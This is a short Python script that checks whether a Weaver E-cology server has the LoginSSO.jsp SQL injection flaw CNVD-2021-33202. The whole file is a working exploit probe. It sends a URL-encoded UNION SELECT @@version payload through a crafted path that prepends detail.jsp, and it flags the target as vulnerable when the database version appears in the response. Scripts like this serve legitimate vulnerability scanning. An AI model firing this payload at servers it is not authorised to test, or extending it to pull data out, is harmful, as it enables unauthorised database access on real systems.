import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-cology-LoginSSO.jsp存在SQL注入漏洞(CNVD-2021-33202)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20@@version%20as%20id%20from%20HrmResourceManager")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult